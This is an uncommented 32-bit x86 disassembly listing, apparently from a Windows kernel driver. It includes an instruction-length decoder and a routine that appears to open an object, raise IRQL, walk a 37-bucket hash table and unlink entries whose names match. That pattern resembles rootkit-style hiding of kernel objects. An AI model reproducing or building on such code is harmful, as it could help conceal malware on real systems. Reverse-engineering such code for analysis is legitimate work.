   197a9:	mov    DWORD PTR [ebp-0x9c],eax
   197af:	mov    DWORD PTR [ebp-0x98],eax
   197b5:	mov    DWORD PTR [ebp-0x94],eax
   197bb:	mov    DWORD PTR [ebp-0x90],eax
   197c1:	mov    DWORD PTR [ebp-0x8c],ecx
   197c7:	mov    DWORD PTR [ebp-0x88],ecx
   197cd:	mov    DWORD PTR [ebp-0x84],ecx
   197d3:	mov    DWORD PTR [ebp-0x80],ecx
   197d6:	mov    DWORD PTR [ebp-0x7c],ecx
   197d9:	mov    DWORD PTR [ebp-0x78],ecx
   197dc:	mov    DWORD PTR [ebp-0x74],ecx
   197df:	mov    DWORD PTR [ebp-0x70],ecx
   197e2:	mov    DWORD PTR [ebp-0x60],ecx
   197e5:	xor    ecx,ecx
   197e7:	inc    ecx
   197e8:	mov    DWORD PTR [ebp-0x4c],ecx
   197eb:	mov    DWORD PTR [ebp-0x44],ecx
   197ee:	mov    DWORD PTR [ebp-0x40],ecx
   197f1:	mov    ecx,0x2000
   197f6:	mov    DWORD PTR [ebp-0x34],ecx
   197f9:	mov    DWORD PTR [ebp-0x30],ecx
   197fc:	or     ecx,0xffffffff
   197ff:	mov    DWORD PTR [ebp-0x6c],esi
   19802:	mov    DWORD PTR [ebp-0x68],esi
   19805:	mov    DWORD PTR [ebp-0x64],0x208
   1980c:	mov    DWORD PTR [ebp-0x5c],edx
   1980f:	mov    DWORD PTR [ebp-0x58],edx
   19812:	mov    DWORD PTR [ebp-0x54],edx
   19815:	mov    DWORD PTR [ebp-0x50],edx
   19818:	mov    DWORD PTR [ebp-0x48],edx
   1981b:	mov    DWORD PTR [ebp-0x3c],edx
   1981e:	mov    DWORD PTR [ebp-0x38],edx
   19821:	mov    DWORD PTR [ebp-0x2c],edx
   19824:	mov    DWORD PTR [ebp-0x28],edx
   19827:	mov    DWORD PTR [ebp-0x24],edx
   1982a:	mov    DWORD PTR [ebp-0x20],edx
   1982d:	mov    DWORD PTR [ebp-0x1c],edx
   19830:	mov    DWORD PTR [ebp-0x18],edx
   19833:	mov    DWORD PTR [ebp-0x14],eax
   19836:	mov    DWORD PTR [ebp-0x10],eax
   19839:	mov    DWORD PTR [ebp-0x80c],eax
   1983f:	mov    DWORD PTR [ebp-0x808],eax
   19845:	mov    DWORD PTR [ebp-0x804],eax
   1984b:	mov    DWORD PTR [ebp-0x800],eax
   19851:	mov    DWORD PTR [ebp-0x7fc],ecx
   19857:	mov    DWORD PTR [ebp-0x7f8],ecx
   1985d:	mov    DWORD PTR [ebp-0x7f4],edx
   19863:	mov    DWORD PTR [ebp-0x7f0],ecx
   19869:	mov    DWORD PTR [ebp-0x7ec],edx
   1986f:	mov    DWORD PTR [ebp-0x7e8],edx
   19875:	mov    DWORD PTR [ebp-0x7e4],edx
   1987b:	mov    DWORD PTR [ebp-0x7e0],edx
   19881:	mov    DWORD PTR [ebp-0x7dc],ecx
   19887:	mov    DWORD PTR [ebp-0x7d8],ecx
   1988d:	mov    DWORD PTR [ebp-0x7d4],ecx
   19893:	mov    DWORD PTR [ebp-0x7d0],ecx
   19899:	mov    DWORD PTR [ebp-0x7cc],ecx
   1989f:	mov    DWORD PTR [ebp-0x7c8],ecx
   198a5:	mov    DWORD PTR [ebp-0x7c4],ecx
   198ab:	mov    DWORD PTR [ebp-0x7c0],ecx
   198b1:	mov    DWORD PTR [ebp-0x7bc],ecx
   198b7:	mov    DWORD PTR [ebp-0x7b8],ecx
   198bd:	mov    DWORD PTR [ebp-0x7b4],ecx
   198c3:	mov    DWORD PTR [ebp-0x7b0],ecx
   198c9:	mov    DWORD PTR [ebp-0x7ac],ecx
   198cf:	mov    DWORD PTR [ebp-0x7a8],ecx
   198d5:	mov    DWORD PTR [ebp-0x7a4],ecx
   198db:	mov    DWORD PTR [ebp-0x7a0],ecx
   198e1:	mov    DWORD PTR [ebp-0x79c],ecx
   198e7:	mov    DWORD PTR [ebp-0x798],ecx
   198ed:	mov    DWORD PTR [ebp-0x794],ecx
   198f3:	mov    DWORD PTR [ebp-0x790],ecx
   198f9:	mov    DWORD PTR [ebp-0x78c],ecx
   198ff:	mov    DWORD PTR [ebp-0x788],ecx
   19905:	mov    DWORD PTR [ebp-0x784],ecx
   1990b:	mov    DWORD PTR [ebp-0x780],ecx
   19911:	mov    DWORD PTR [ebp-0x77c],ecx
   19917:	mov    DWORD PTR [ebp-0x778],ecx
   1991d:	mov    DWORD PTR [ebp-0x774],ecx
   19923:	mov    DWORD PTR [ebp-0x770],ecx
   19929:	mov    DWORD PTR [ebp-0x76c],ecx
   1992f:	mov    DWORD PTR [ebp-0x768],ecx
   19935:	mov    DWORD PTR [ebp-0x764],ecx
   1993b:	mov    DWORD PTR [ebp-0x760],ecx
   19941:	mov    DWORD PTR [ebp-0x75c],ecx
   19947:	mov    DWORD PTR [ebp-0x758],ecx
   1994d:	mov    DWORD PTR [ebp-0x754],ecx
   19953:	mov    DWORD PTR [ebp-0x750],ecx
   19959:	mov    DWORD PTR [ebp-0x74c],ecx
   1995f:	mov    DWORD PTR [ebp-0x748],ecx
   19965:	mov    DWORD PTR [ebp-0x744],ecx
   1996b:	mov    DWORD PTR [ebp-0x740],ecx
   19971:	mov    DWORD PTR [ebp-0x73c],ecx
   19977:	mov    DWORD PTR [ebp-0x738],ecx
   1997d:	mov    DWORD PTR [ebp-0x734],ecx
   19983:	mov    DWORD PTR [ebp-0x730],ecx
   19989:	mov    DWORD PTR [ebp-0x72c],ecx
   1998f:	mov    DWORD PTR [ebp-0x728],ecx
   19995:	mov    DWORD PTR [ebp-0x724],ecx
   1999b:	mov    DWORD PTR [ebp-0x720],ecx
   199a1:	mov    DWORD PTR [ebp-0x71c],ecx
   199a7:	mov    DWORD PTR [ebp-0x718],ecx
   199ad:	mov    DWORD PTR [ebp-0x714],ecx
   199b3:	mov    DWORD PTR [ebp-0x710],ecx
   199b9:	mov    DWORD PTR [ebp-0x70c],ecx
   199bf:	mov    DWORD PTR [ebp-0x708],ecx
   199c5:	mov    DWORD PTR [ebp-0x704],ecx
   199cb:	mov    DWORD PTR [ebp-0x700],ecx
   199d1:	mov    DWORD PTR [ebp-0x6fc],ecx
   199d7:	mov    DWORD PTR [ebp-0x6f8],ecx
   199dd:	mov    DWORD PTR [ebp-0x6f4],ecx
   199e3:	mov    DWORD PTR [ebp-0x6f0],ecx
   199e9:	mov    DWORD PTR [ebp-0x6ec],ecx
   199ef:	mov    DWORD PTR [ebp-0x6e8],ecx
   199f5:	mov    DWORD PTR [ebp-0x6e4],ecx
   199fb:	mov    DWORD PTR [ebp-0x6e0],ecx
   19a01:	mov    DWORD PTR [ebp-0x6dc],ecx
   19a07:	mov    DWORD PTR [ebp-0x6d8],ecx
   19a0d:	mov    DWORD PTR [ebp-0x6d4],ecx
   19a13:	mov    DWORD PTR [ebp-0x6d0],ecx
   19a19:	mov    DWORD PTR [ebp-0x6cc],ecx
   19a1f:	mov    DWORD PTR [ebp-0x6c8],ecx
   19a25:	mov    DWORD PTR [ebp-0x6c4],ecx
   19a2b:	mov    DWORD PTR [ebp-0x6c0],ecx
   19a31:	mov    DWORD PTR [ebp-0x6bc],ecx
   19a37:	mov    DWORD PTR [ebp-0x6b8],ecx
   19a3d:	mov    DWORD PTR [ebp-0x6b4],ecx
   19a43:	mov    DWORD PTR [ebp-0x6b0],ecx
   19a49:	mov    DWORD PTR [ebp-0x6ac],ecx
   19a4f:	mov    DWORD PTR [ebp-0x6a8],ecx
   19a55:	mov    DWORD PTR [ebp-0x6a4],ecx
   19a5b:	mov    DWORD PTR [ebp-0x6a0],ecx
   19a61:	mov    DWORD PTR [ebp-0x69c],ecx
   19a67:	mov    DWORD PTR [ebp-0x698],ecx
   19a6d:	mov    DWORD PTR [ebp-0x694],ecx
   19a73:	mov    DWORD PTR [ebp-0x690],ecx
   19a79:	mov    DWORD PTR [ebp-0x68c],ecx
   19a7f:	mov    DWORD PTR [ebp-0x688],ecx
   19a85:	mov    DWORD PTR [ebp-0x684],ecx
   19a8b:	mov    DWORD PTR [ebp-0x680],ecx
   19a91:	mov    DWORD PTR [ebp-0x67c],ecx
   19a97:	mov    DWORD PTR [ebp-0x678],ecx
   19a9d:	mov    DWORD PTR [ebp-0x674],ecx
   19aa3:	mov    DWORD PTR [ebp-0x670],ecx
   19aa9:	mov    DWORD PTR [ebp-0x66c],ecx
   19aaf:	mov    DWORD PTR [ebp-0x668],ecx
   19ab5:	mov    DWORD PTR [ebp-0x664],ecx
   19abb:	mov    DWORD PTR [ebp-0x660],ecx
   19ac1:	mov    DWORD PTR [ebp-0x65c],ecx
   19ac7:	mov    DWORD PTR [ebp-0x658],ecx
   19acd:	mov    DWORD PTR [ebp-0x654],ecx
   19ad3:	mov    DWORD PTR [ebp-0x650],ecx
   19ad9:	mov    DWORD PTR [ebp-0x64c],ecx
   19adf:	mov    DWORD PTR [ebp-0x648],ecx
   19ae5:	mov    DWORD PTR [ebp-0x644],ecx
   19aeb:	mov    DWORD PTR [ebp-0x640],ecx
   19af1:	mov    DWORD PTR [ebp-0x63c],ecx
   19af7:	mov    DWORD PTR [ebp-0x638],ecx
   19afd:	mov    DWORD PTR [ebp-0x634],ecx
   19b03:	mov    DWORD PTR [ebp-0x630],ecx
   19b09:	mov    DWORD PTR [ebp-0x62c],ecx
   19b0f:	mov    DWORD PTR [ebp-0x628],ecx
   19b15:	mov    DWORD PTR [ebp-0x624],ecx
   19b1b:	mov    DWORD PTR [ebp-0x620],ecx
   19b21:	mov    DWORD PTR [ebp-0x61c],ecx
   19b27:	mov    DWORD PTR [ebp-0x618],ecx
   19b2d:	mov    DWORD PTR [ebp-0x614],ecx
   19b33:	mov    DWORD PTR [ebp-0x610],ecx
   19b39:	mov    DWORD PTR [ebp-0x60c],esi
   19b3f:	mov    DWORD PTR [ebp-0x608],esi
   19b45:	mov    DWORD PTR [ebp-0x604],esi
   19b4b:	mov    DWORD PTR [ebp-0x600],esi
   19b51:	mov    DWORD PTR [ebp-0x5fc],esi
   19b57:	mov    DWORD PTR [ebp-0x5f8],esi
   19b5d:	mov    DWORD PTR [ebp-0x5f4],esi
   19b63:	mov    DWORD PTR [ebp-0x5f0],esi
   19b69:	mov    DWORD PTR [ebp-0x5ec],esi
   19b6f:	mov    DWORD PTR [ebp-0x5e8],esi
   19b75:	mov    DWORD PTR [ebp-0x5e4],esi
   19b7b:	mov    DWORD PTR [ebp-0x5e0],esi
   19b81:	mov    DWORD PTR [ebp-0x5dc],esi
   19b87:	mov    DWORD PTR [ebp-0x5d8],esi
   19b8d:	mov    DWORD PTR [ebp-0x5d4],esi
   19b93:	mov    DWORD PTR [ebp-0x5d0],esi
   19b99:	mov    DWORD PTR [ebp-0x5cc],eax
   19b9f:	mov    DWORD PTR [ebp-0x5c8],eax
   19ba5:	mov    DWORD PTR [ebp-0x5c4],eax
   19bab:	mov    DWORD PTR [ebp-0x5c0],eax
   19bb1:	mov    DWORD PTR [ebp-0x5bc],eax
   19bb7:	mov    DWORD PTR [ebp-0x5b8],eax
   19bbd:	mov    DWORD PTR [ebp-0x5b4],eax
   19bc3:	mov    DWORD PTR [ebp-0x5b0],eax
   19bc9:	mov    DWORD PTR [ebp-0x5ac],eax
   19bcf:	mov    DWORD PTR [ebp-0x5a8],eax
   19bd5:	mov    DWORD PTR [ebp-0x5a4],eax
   19bdb:	mov    DWORD PTR [ebp-0x5a0],eax
   19be1:	mov    DWORD PTR [ebp-0x59c],eax
   19be7:	mov    DWORD PTR [ebp-0x598],eax
   19bed:	mov    DWORD PTR [ebp-0x594],eax
   19bf3:	mov    DWORD PTR [ebp-0x590],eax
   19bf9:	mov    DWORD PTR [ebp-0x58c],edx
   19bff:	mov    DWORD PTR [ebp-0x588],edx
   19c05:	mov    DWORD PTR [ebp-0x584],edx
   19c0b:	mov    DWORD PTR [ebp-0x580],eax
   19c11:	mov    DWORD PTR [ebp-0x57c],ebx
   19c17:	mov    DWORD PTR [ebp-0x578],eax
   19c1d:	mov    DWORD PTR [ebp-0x574],ecx
   19c23:	mov    DWORD PTR [ebp-0x570],ecx
   19c29:	mov    DWORD PTR [ebp-0x56c],edx
   19c2f:	mov    DWORD PTR [ebp-0x568],edx
   19c35:	mov    DWORD PTR [ebp-0x564],edx
   19c3b:	mov    DWORD PTR [ebp-0x560],eax
   19c41:	mov    DWORD PTR [ebp-0x55c],ebx
   19c47:	mov    DWORD PTR [ebp-0x558],eax
   19c4d:	mov    DWORD PTR [ebp-0x554],ecx
   19c53:	mov    DWORD PTR [ebp-0x550],eax
   19c59:	mov    DWORD PTR [ebp-0x54c],eax
   19c5f:	mov    DWORD PTR [ebp-0x548],eax
   19c65:	mov    DWORD PTR [ebp-0x544],eax
   19c6b:	mov    DWORD PTR [ebp-0x540],eax
   19c71:	mov    DWORD PTR [ebp-0x53c],eax
   19c77:	mov    DWORD PTR [ebp-0x538],eax
   19c7d:	mov    DWORD PTR [ebp-0x534],eax
   19c83:	mov    DWORD PTR [ebp-0x530],eax
   19c89:	mov    DWORD PTR [ebp-0x52c],ecx
   19c8f:	mov    DWORD PTR [ebp-0x528],ecx
   19c95:	mov    DWORD PTR [ebp-0x524],ebx
   19c9b:	mov    DWORD PTR [ebp-0x520],eax
   19ca1:	mov    DWORD PTR [ebp-0x51c],eax
   19ca7:	mov    DWORD PTR [ebp-0x518],eax
   19cad:	mov    DWORD PTR [ebp-0x514],eax
   19cb3:	mov    DWORD PTR [ebp-0x510],eax
   19cb9:	mov    DWORD PTR [ebp-0x50c],eax
   19cbf:	mov    DWORD PTR [ebp-0x508],eax
   19cc5:	mov    DWORD PTR [ebp-0x504],ecx
   19ccb:	mov    DWORD PTR [ebp-0x500],ecx
   19cd1:	mov    DWORD PTR [ebp-0x4fc],ecx
   19cd7:	mov    DWORD PTR [ebp-0x4f8],ecx
   19cdd:	mov    DWORD PTR [ebp-0x4f4],ecx
   19ce3:	mov    DWORD PTR [ebp-0x4f0],ecx
   19ce9:	mov    DWORD PTR [ebp-0x4ec],edx
   19cef:	mov    DWORD PTR [ebp-0x4e8],edx
   19cf5:	mov    DWORD PTR [ebp-0x4e4],edx
   19cfb:	mov    DWORD PTR [ebp-0x4e0],edx
   19d01:	mov    DWORD PTR [ebp-0x4dc],edx
   19d07:	mov    DWORD PTR [ebp-0x4d8],edx
   19d0d:	mov    DWORD PTR [ebp-0x4d4],edx
   19d13:	mov    DWORD PTR [ebp-0x4d0],edx
   19d19:	mov    DWORD PTR [ebp-0x4cc],ecx
   19d1f:	mov    DWORD PTR [ebp-0x4c8],ecx
   19d25:	mov    DWORD PTR [ebp-0x4c4],ecx
   19d2b:	mov    DWORD PTR [ebp-0x4c0],ecx
   19d31:	mov    DWORD PTR [ebp-0x4bc],ecx
   19d37:	mov    DWORD PTR [ebp-0x4b8],ecx
   19d3d:	mov    DWORD PTR [ebp-0x4b4],ecx
   19d43:	mov    DWORD PTR [ebp-0x4b0],ecx
   19d49:	mov    DWORD PTR [ebp-0x4ac],ecx
   19d4f:	mov    DWORD PTR [ebp-0x4a8],ecx
   19d55:	mov    DWORD PTR [ebp-0x4a4],ecx
   19d5b:	mov    DWORD PTR [ebp-0x4a0],ecx
   19d61:	mov    DWORD PTR [ebp-0x49c],ecx
   19d67:	mov    DWORD PTR [ebp-0x498],ecx
   19d6d:	mov    DWORD PTR [ebp-0x494],ecx
   19d73:	mov    DWORD PTR [ebp-0x490],ecx
   19d79:	mov    DWORD PTR [ebp-0x48c],ecx
   19d7f:	mov    DWORD PTR [ebp-0x488],ecx
   19d85:	mov    DWORD PTR [ebp-0x484],ecx
   19d8b:	mov    DWORD PTR [ebp-0x480],ecx
   19d91:	mov    DWORD PTR [ebp-0x47c],ecx
   19d97:	mov    DWORD PTR [ebp-0x478],ecx
   19d9d:	mov    DWORD PTR [ebp-0x474],ecx
   19da3:	mov    DWORD PTR [ebp-0x470],ecx
   19da9:	mov    DWORD PTR [ebp-0x46c],ecx
   19daf:	mov    DWORD PTR [ebp-0x468],ecx
   19db5:	mov    DWORD PTR [ebp-0x464],ecx
   19dbb:	mov    DWORD PTR [ebp-0x460],ecx
   19dc1:	mov    DWORD PTR [ebp-0x45c],ecx
   19dc7:	mov    DWORD PTR [ebp-0x458],ecx
   19dcd:	mov    DWORD PTR [ebp-0x454],ecx
   19dd3:	mov    DWORD PTR [ebp-0x450],ecx
   19dd9:	mov    DWORD PTR [ebp-0x44c],ecx
   19ddf:	mov    DWORD PTR [ebp-0x448],ecx
   19de5:	mov    DWORD PTR [ebp-0x444],ecx
   19deb:	mov    DWORD PTR [ebp-0x440],ecx
   19df1:	mov    DWORD PTR [ebp-0x43c],ecx
   19df7:	mov    DWORD PTR [ebp-0x438],ecx
   19dfd:	mov    DWORD PTR [ebp-0x434],ecx
   19e03:	mov    DWORD PTR [ebp-0x430],ecx
   19e09:	mov    DWORD PTR [ebp-0x42c],ecx
   19e0f:	mov    DWORD PTR [ebp-0x428],ecx
   19e15:	mov    DWORD PTR [ebp-0x424],ecx
   19e1b:	mov    DWORD PTR [ebp-0x420],ecx
   19e21:	mov    DWORD PTR [ebp-0x41c],ecx
   19e27:	mov    DWORD PTR [ebp-0x418],ecx
   19e2d:	mov    DWORD PTR [ebp-0x414],ecx
   19e33:	mov    DWORD PTR [ebp-0x410],ecx
   19e39:	mov    esi,DWORD PTR [ebp-0xc]
   19e3c:	mov    bl,BYTE PTR [esi]
   19e3e:	mov    esi,DWORD PTR [ebp-0x8]
   19e41:	inc    DWORD PTR [ebp-0xc]
   19e44:	mov    BYTE PTR [ebp-0x1],bl
   19e47:	movzx  ebx,bl
   19e4a:	or     esi,DWORD PTR [ebp+ebx*4-0x40c]
   19e51:	mov    DWORD PTR [ebp-0x8],esi
   19e54:	test   si,0x2000
   19e59:	mov    esi,DWORD PTR [ebp-0xc]
   19e5c:	je     0x19e78
   19e5e:	mov    bl,BYTE PTR [esi]
   19e60:	and    bl,0x38
   19e63:	neg    bl
   19e65:	sbb    ebx,ebx
   19e67:	and    ebx,0xfffff000
   19e6d:	add    ebx,0x1800
   19e73:	mov    DWORD PTR [ebp-0x8],ebx
   19e76:	jmp    0x19e7b
   19e78:	mov    ebx,DWORD PTR [ebp-0x8]
   19e7b:	test   bx,0x4000
   19e80:	je     0x19e98
   19e82:	mov    bl,BYTE PTR [esi]
   19e84:	mov    BYTE PTR [ebp-0x1],bl
   19e87:	movzx  ebx,bl
   19e8a:	mov    ebx,DWORD PTR [ebp+ebx*4-0x80c]
   19e91:	inc    esi
   19e92:	mov    DWORD PTR [ebp-0xc],esi
   19e95:	mov    DWORD PTR [ebp-0x8],ebx
   19e98:	cmp    DWORD PTR [ebp-0x8],ecx
   19e9b:	je     0x19ead
   19e9d:	mov    ebx,DWORD PTR [ebp-0x8]
   19ea0:	test   bl,0x1
   19ea3:	je     0x19eb7
   19ea5:	and    ebx,0xfffffffe
   19ea8:	mov    DWORD PTR [ebp-0x8],ebx
   19eab:	jmp    0x19e39
   19ead:	mov    eax,DWORD PTR [ebp+0xc]
   19eb0:	mov    DWORD PTR [eax],ecx
   19eb2:	jmp    0x19f8b
   19eb7:	test   edi,ebx
   19eb9:	je     0x19ec9
   19ebb:	test   BYTE PTR [ebp-0x1],0x1
   19ebf:	je     0x19ec6
   19ec1:	or     ebx,0x8
   19ec4:	jmp    0x19ec9
   19ec6:	or     ebx,0x10
   19ec9:	test   eax,ebx
   19ecb:	mov    edi,0x200
   19ed0:	je     0x19f31
   19ed2:	mov    al,BYTE PTR [esi]
   19ed4:	mov    cl,al
   19ed6:	and    cl,0xc0
   19ed9:	inc    esi
   19eda:	and    al,0x7
   19edc:	cmp    cl,0xc0
   19edf:	je     0x19f31
   19ee1:	test   bl,0x4
   19ee4:	je     0x19f04
   19ee6:	cmp    cl,dl
   19ee8:	jne    0x19ef0
   19eea:	cmp    al,0x6
   19eec:	jne    0x19f31
   19eee:	or     ebx,edi
   19ef0:	cmp    cl,0x40
   19ef3:	jne    0x19efb
   19ef5:	or     ebx,0x100
   19efb:	cmp    cl,0x80
   19efe:	jne    0x19f31
   19f00:	or     ebx,edi
   19f02:	jmp    0x19f31
   19f04:	cmp    cl,0x40
   19f07:	jne    0x19f0f
   19f09:	or     ebx,0x100
   19f0f:	cmp    cl,0x80
   19f12:	jne    0x19f1a
   19f14:	or     ebx,0x400
   19f1a:	cmp    al,0x4
   19f1c:	jne    0x19f23
   19f1e:	mov    al,BYTE PTR [esi]
   19f20:	and    al,0x7
   19f22:	inc    esi
   19f23:	cmp    al,0x5
   19f25:	jne    0x19f31
   19f27:	cmp    cl,dl
   19f29:	jne    0x19f31
   19f2b:	or     ebx,0x400
   19f31:	test   bl,bl
   19f33:	jns    0x19f44
   19f35:	test   bl,0x4
   19f38:	je     0x19f3e
   19f3a:	or     ebx,edi
   19f3c:	jmp    0x19f44
   19f3e:	or     ebx,0x400
   19f44:	test   bl,0x8
   19f47:	je     0x19f56
   19f49:	test   bl,0x2
   19f4c:	je     0x19f53
   19f4e:	or     ebx,0x20
   19f51:	jmp    0x19f56
   19f53:	or     ebx,0x40
   19f56:	test   bx,0x100
   19f5b:	je     0x19f5e
   19f5d:	inc    esi
   19f5e:	test   edi,ebx
   19f60:	je     0x19f64
   19f62:	inc    esi
   19f63:	inc    esi
   19f64:	test   bx,0x400
   19f69:	je     0x19f6e
   19f6b:	add    esi,0x4
   19f6e:	test   bl,0x10
   19f71:	je     0x19f74
   19f73:	inc    esi
   19f74:	test   bl,0x20
   19f77:	je     0x19f7b
   19f79:	inc    esi
   19f7a:	inc    esi
   19f7b:	test   bl,0x40
   19f7e:	je     0x19f83
   19f80:	add    esi,0x4
   19f83:	sub    esi,DWORD PTR [ebp+0x8]
   19f86:	mov    eax,DWORD PTR [ebp+0xc]
   19f89:	mov    DWORD PTR [eax],esi
   19f8b:	pop    edi
   19f8c:	pop    esi
   19f8d:	pop    ebx
   19f8e:	leave  
   19f8f:	ret    0x8
   19f92:	int3   
   19f93:	int3   
   19f94:	int3   
   19f95:	int3   
   19f96:	int3   
   19f97:	int3   
   19f98:	push   0x8
   19f9a:	push   0x1b630
   19f9f:	call   0x1a1c8
   19fa4:	and    DWORD PTR [ebp-0x4],0x0
   19fa8:	mov    eax,DWORD PTR [ebp+0x10]
   19fab:	shr    eax,1
   19fad:	push   eax
   19fae:	push   DWORD PTR [ebp+0xc]
   19fb1:	push   DWORD PTR [ebp+0x8]
   19fb4:	call   DWORD PTR ds:0x1b268
   19fba:	add    esp,0xc
   19fbd:	neg    eax
   19fbf:	sbb    al,al
   19fc1:	inc    al
   19fc3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   19fca:	jmp    0x19fdc
   19fcc:	xor    eax,eax
   19fce:	inc    eax
   19fcf:	ret    
   19fd0:	mov    esp,DWORD PTR [ebp-0x18]
   19fd3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   19fda:	xor    al,al
   19fdc:	call   0x1a20d
   19fe1:	ret    0xc
   19fe4:	int3   
   19fe5:	int3   
   19fe6:	int3   
   19fe7:	int3   
   19fe8:	int3   
   19fe9:	int3   
   19fea:	mov    edi,edi
   19fec:	push   ebp
   19fed:	mov    ebp,esp
   19fef:	sub    esp,0x30
   19ff2:	push   ebx
   19ff3:	push   DWORD PTR [ebp+0x8]
   19ff6:	xor    ebx,ebx
   19ff8:	lea    eax,[ebp-0x18]
   19ffb:	push   eax
   19ffc:	mov    DWORD PTR [ebp-0x10],ebx
   19fff:	mov    DWORD PTR [ebp-0xc],ebx
   1a002:	mov    BYTE PTR [ebp-0x1],bl
   1a005:	call   DWORD PTR ds:0x1b164
   1a00b:	lea    eax,[ebp-0x18]
   1a00e:	mov    DWORD PTR [ebp-0x28],eax
   1a011:	lea    eax,[ebp-0x10]
   1a014:	push   eax
   1a015:	push   ebx
   1a016:	push   0x80000000
   1a01b:	push   ebx
   1a01c:	push   ebx
   1a01d:	push   ebx
   1a01e:	lea    eax,[ebp-0x30]
   1a021:	push   eax
   1a022:	mov    DWORD PTR [ebp-0x30],0x18
   1a029:	mov    DWORD PTR [ebp-0x2c],ebx
   1a02c:	mov    DWORD PTR [ebp-0x24],0x40
   1a033:	mov    DWORD PTR [ebp-0x20],ebx
   1a036:	mov    DWORD PTR [ebp-0x1c],ebx
   1a039:	call   DWORD PTR ds:0x1b26c
   1a03f:	test   eax,eax
   1a041:	jl     0x1a13c
   1a047:	push   ebx
   1a048:	lea    eax,[ebp-0xc]
   1a04b:	push   eax
   1a04c:	push   ebx
   1a04d:	push   ebx
   1a04e:	push   ebx
   1a04f:	push   DWORD PTR [ebp-0x10]
   1a052:	call   DWORD PTR ds:0x1b19c
   1a058:	test   eax,eax
   1a05a:	jl     0x1a13c
   1a060:	mov    cl,0x1
   1a062:	call   DWORD PTR ds:0x1b108
   1a068:	push   esi
   1a069:	mov    BYTE PTR [ebp+0xb],al
   1a06c:	mov    DWORD PTR [ebp-0x8],ebx
   1a06f:	push   edi
   1a070:	cmp    BYTE PTR [ebp-0x1],bl
   1a073:	jne    0x1a131
   1a079:	mov    eax,DWORD PTR [ebp-0xc]
   1a07c:	mov    ecx,DWORD PTR [ebp-0x8]
   1a07f:	mov    esi,DWORD PTR [eax+ecx*4]
   1a082:	cmp    esi,ebx
   1a084:	je     0x1a10c
   1a08a:	mov    eax,DWORD PTR [esi+0x4]
   1a08d:	mov    cl,BYTE PTR [eax-0xc]
   1a090:	sub    eax,0x18
   1a093:	cmp    cl,bl
   1a095:	je     0x1a0fc
   1a097:	movzx  ecx,cl
   1a09a:	sub    eax,ecx
   1a09c:	je     0x1a0fc
   1a09e:	mov    ecx,DWORD PTR [eax+0x4]
   1a0a1:	mov    eax,DWORD PTR [eax+0x8]
   1a0a4:	movzx  ecx,cx
   1a0a7:	push   ecx
   1a0a8:	push   DWORD PTR [ebp+0xc]
   1a0ab:	push   eax
   1a0ac:	call   0x19f98
   1a0b1:	test   al,al
   1a0b3:	je     0x1a0fc
   1a0b5:	mov    ecx,DWORD PTR [ebp-0x8]
   1a0b8:	mov    eax,DWORD PTR [ebp-0xc]
   1a0bb:	shl    ecx,0x2
   1a0be:	lea    edx,[ecx+eax*1]
   1a0c1:	mov    eax,DWORD PTR [edx]
   1a0c3:	mov    eax,DWORD PTR [eax]
   1a0c5:	mov    DWORD PTR [edx],eax
   1a0c7:	mov    edx,DWORD PTR [ebp-0xc]
   1a0ca:	mov    ecx,DWORD PTR [ecx+edx*1]
   1a0cd:	jmp    0x1a123
   1a0cf:	mov    eax,DWORD PTR [edi+0x4]
   1a0d2:	mov    cl,BYTE PTR [eax-0xc]
   1a0d5:	sub    eax,0x18
   1a0d8:	cmp    cl,bl
   1a0da:	je     0x1a0fa
   1a0dc:	movzx  ecx,cl
   1a0df:	sub    eax,ecx
   1a0e1:	je     0x1a0fa
   1a0e3:	mov    ecx,DWORD PTR [eax+0x4]
   1a0e6:	mov    eax,DWORD PTR [eax+0x8]
   1a0e9:	movzx  ecx,cx
   1a0ec:	push   ecx
   1a0ed:	push   DWORD PTR [ebp+0xc]
   1a0f0:	push   eax
   1a0f1:	call   0x19f98
   1a0f6:	test   al,al
   1a0f8:	jne    0x1a104
   1a0fa:	mov    esi,DWORD PTR [esi]
   1a0fc:	mov    edi,DWORD PTR [esi]
   1a0fe:	cmp    edi,ebx
   1a100:	jne    0x1a0cf
   1a102:	jmp    0x1a10c
   1a104:	mov    eax,DWORD PTR [edi]
   1a106:	mov    DWORD PTR [esi],eax
   1a108:	mov    BYTE PTR [ebp-0x1],0x1
   1a10c:	inc    DWORD PTR [ebp-0x8]
   1a10f:	cmp    DWORD PTR [ebp-0x8],0x25
   1a113:	jb     0x1a070
   1a119:	jmp    0x1a131
   1a11b:	mov    edx,DWORD PTR [eax]
   1a11d:	mov    DWORD PTR [ecx],edx
   1a11f:	mov    eax,DWORD PTR [eax]
   1a121:	mov    ecx,edx
   1a123:	cmp    eax,ebx
   1a125:	jne    0x1a11b
   1a127:	cmp    ecx,ebx
   1a129:	je     0x1a12d
   1a12b:	mov    DWORD PTR [ecx],ebx
   1a12d:	mov    BYTE PTR [ebp-0x1],0x1
   1a131:	mov    cl,BYTE PTR [ebp+0xb]
   1a134:	call   DWORD PTR ds:0x1b104
   1a13a:	pop    edi
   1a13b:	pop    esi
   1a13c:	mov    ecx,DWORD PTR [ebp-0xc]
   1a13f:	cmp    ecx,ebx
   1a141:	je     0x1a149
   1a143:	call   DWORD PTR ds:0x1b284
   1a149:	cmp    DWORD PTR [ebp-0x10],ebx
   1a14c:	pop    ebx
   1a14d:	je     0x1a158
   1a14f:	push   DWORD PTR [ebp-0x10]
   1a152:	call   DWORD PTR ds:0x1b180
   1a158:	mov    al,BYTE PTR [ebp-0x1]
   1a15b:	leave  
   1a15c:	ret    0x8
   1a15f:	int3   
   1a160:	int3   
   1a161:	int3   
   1a162:	int3   
   1a163:	int3   
   1a164:	cmp    ecx,DWORD PTR ds:0x1bb6c
   1a16a:	jne    0x1a16e
   1a16c:	repz ret 
   1a16e:	jmp    0x1a178
   1a173:	int3   
   1a174:	int3   
   1a175:	int3   
   1a176:	int3   
   1a177:	int3   
   1a178:	mov    edi,edi
   1a17a:	push   ebp
   1a17b:	mov    ebp,esp
   1a17d:	push   ecx
   1a17e:	mov    DWORD PTR [ebp-0x4],ecx
   1a181:	push   0x0
   1a183:	push   DWORD PTR ds:0x1bb70
   1a189:	push   DWORD PTR ds:0x1bb6c
   1a18f:	push   DWORD PTR [ebp-0x4]
   1a192:	push   0xf7
   1a197:	call   DWORD PTR ds:0x1b274
   1a19d:	int3   
   1a19e:	int3   
   1a19f:	int3   
   1a1a0:	int3   
   1a1a1:	int3   
   1a1a2:	int3   
   1a1a3:	int3   
